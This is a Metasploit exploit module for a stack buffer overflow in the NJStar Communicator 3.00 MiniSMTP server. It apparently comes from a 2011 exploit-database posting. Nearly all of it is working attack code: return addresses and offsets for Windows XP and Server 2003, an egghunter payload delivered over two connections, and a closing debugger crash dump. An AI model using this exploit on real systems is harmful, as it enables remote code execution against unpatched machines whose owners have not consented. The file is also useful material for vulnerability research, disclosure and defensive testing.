# Exploit Title: NJStar Communicator 3.00 MiniSMTP Server Remote Exploit
# Date: 10/31/2011
# Author: Dillon Beresford
# Twitter: https://twitter.com/#!/D1N
# Software Link: http://www.njstar.com/download/njcom.exe
# Version: 3.00 and prior
# Build: 11818 and prior
# Tested on: Windows XP SP3/SP2/SP1 and Windows Server 2003 SP0
# CVE : NONE
# Shouts to bannedit, sinn3r, rick2600, tmanning, corelanc0d3r, jcran,
# manils, d0tslash, mublix, halsten, and everyone at AHA!
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
#
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Egghunter
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;      => &#039;NJStar Communicator 3.00 MiniSMTP Server Remote Exploit&#039;,
            &#039;Description&#039;   => %q{
                    This module exploits a stack overflow vulnerability in NJStar Communicator
                    Version 3.00 MiniSMTP server. 
            },
            &#039;License&#039;       => MSF_LICENSE,
            &#039;Author&#039;        =>
                [
                    &#039;Dillon Beresford&#039;, # Original discovery and MSF Module.
                    &#039;Corelan Team&#039;, # tx for mona.py, all the tuts, and for being awesome. :)
                ],
            &#039;Version&#039;       => &#039;$Revision:$&#039;,
            &#039;References&#039;    =>
                [
                    [ &#039;OSVDB&#039;, &#039;&#039; ],
                    [ &#039;CVE&#039;, &#039;&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.njstar.com/cms/njstar-communicator&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.youtube.com/watch?v=KvkKX035484&#039;],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;thread&#039;,
                },
            &#039;Platform&#039;  => &#039;win&#039;,
            &#039;Payload&#039;   =>
                {
          &#039;BadChars&#039; => "\x00",
          &#039;StackAdjustment&#039; => -1500,
                },
 
            &#039;Targets&#039;       =>
                [
                    [ &#039;Windows XP SP3&#039;,
                        {
                &#039;Ret&#039;       =>   0x7c874413,
                &#039;Offset&#039;    =>   247,
                        } # jmp esp kernel32.dll
                ],
                [ &#039;Windows XP SP2&#039;,
                    {
                      &#039;Ret&#039;     => 0x77558952,
                      &#039;Offset&#039;  => 247,
                    } # jmp esp ntdll.dll
                ],
                [ &#039;Windows XP SP1&#039;,
                    {
                      &#039;Ret&#039;     => 0x77d718fc,
                      &#039;Offset&#039;  => 247,
                    } # jmp esp user32.dll
                ],
                [ &#039;Windows Server 2003 SP0&#039;,
                        {
                &#039;Ret&#039;       =>   0x71c033a0,
                &#039;Offset&#039;    =>   247,
                        } # jmp esp ntdll.dll
                ],
                ], # Feel free to add more targets.
            &#039;Privileged&#039;    => false,
            &#039;DisclosureDate&#039;    => &#039;OCT 31 2011&#039;,
            &#039;DefaultTarget&#039; => 0))
 
        register_options([Opt::RPORT(25)], self.class)
 
    end
   
    def exploit
 
    eggoptions =
    {
        :checksum => true,
        :eggtag => "w00t"
    }
 
    badchars = &#039;\x00&#039;
    hunter,egg = generate_egghunter(payload.encoded,badchars,eggoptions)
       
    if target.name =~ /Windows XP SP3/
         
      buffer =  rand_text(target[&#039;Offset&#039;])
      buffer << [target.ret].pack(&#039;V&#039;)
      buffer << hunter
      buffer << make_nops(4)
       
    elsif target.name =~ /Windows XP SP2/
       
      buffer =  rand_text(target[&#039;Offset&#039;])
      buffer << [target.ret].pack(&#039;V&#039;)
      buffer << hunter
      buffer << make_nops(4)
       
    elsif target.name =~ /Windows XP SP1/
       
      buffer = rand_text(target[&#039;Offset&#039;])
      buffer << [target.ret].pack(&#039;V&#039;)
      buffer << hunter
      buffer << make_nops(4)
       
    elsif target.name =~ /Windows Server 2003 SP0/
 
      buffer = rand_text(target[&#039;Offset&#039;])
      buffer << [target.ret].pack(&#039;V&#039;)
      buffer << hunter
      buffer << make_nops(4)
       
    end
       
    # Just some debugging output so we can see lengths and byte size of each of our buffer.
    print_status("egg: %u bytes: \n" % egg.length + Rex::Text.to_hex_dump(egg))
    print_status("hunter: %u bytes: \n" % hunter.length + Rex::Text.to_hex_dump(hunter))
    print_status("buffer: %u bytes:\n" % buffer.length + Rex::Text.to_hex_dump(buffer))
       
    print_status("Trying target #{target.name}...")
       
    # har har har you get trick no treat...
    # we dont have very much space so we
    # send our egg in a seperate connection
       
    connect
       
    print_status("Sending the egg...")
    sock.put(egg)
       
    # I think you betta call, ghostbusters...
    # now we send our evil buffer along with the
    # egg hunter, we are doing multiple connections
    # to solve the issue with limited stack space.
    # thanks to bannedit for advice on threads and
    # making multiple connections to get around
    # stack space constraints. :)
       
    connect
       
    print_status("Sending our buffer containing the egg hunter...")
    sock.put(buffer)
     
        handler
        disconnect
    end
end
 
##
# No response as of 10/31/11 from AUSCERT or the software vendor. CNCERT and USCERT responded
# on 10/30/11 and 10/31/11, CNCERT said in an email they needed to see if the vulnerability
# is remotely exploitable and needed more verification. I sent a proof of concept exploit
# in python with remote code execution. So, here is the proof that the bug is, in fact,
# remotely exploitable. WIN!
##
 
##
# eax=00000000 ebx=00417bf8 ecx=00002745 edx=00000000 esi=008a3e50
# edi=008a3d80
# eip=42424242 esp=00ccff70 ebp=7c8097d0 iopl=0         nv up ei pl nz na pe nc
# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000           
# efl=00010206
# 42424242 ??              ???
# 0:003> !exchain
# image00400000+bbc4 (0040bbc4)
# 00ccff00: 41414141
# Invalid exception stack at 41414141
# 0:003> d esp
# 00ccff70  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
# 00ccff80  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
# 00ccff90  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
# 00ccffa0  44 44 44 44 00 ff cc 00-c4 bb 40 00 20 23 41 00  DDDD......@. #A.
# 00ccffb0  00 00 00 00 ec ff cc 00-29 b7 80 7c b8 3d 8a 00  ........)..|.=..
# 00ccffc0  00 00 00 00 00 00 00 00-b8 3d 8a 00 00 c0 fd 7f  .........=......
# 00ccffd0  00 d6 e3 89 c0 ff cc 00-98 08 99 89 ff ff ff ff  ................
# 00ccffe0  d8 9a 83 7c 30 b7 80 7c-00 00 00 00 00 00 00 00  ...|0..|........
##



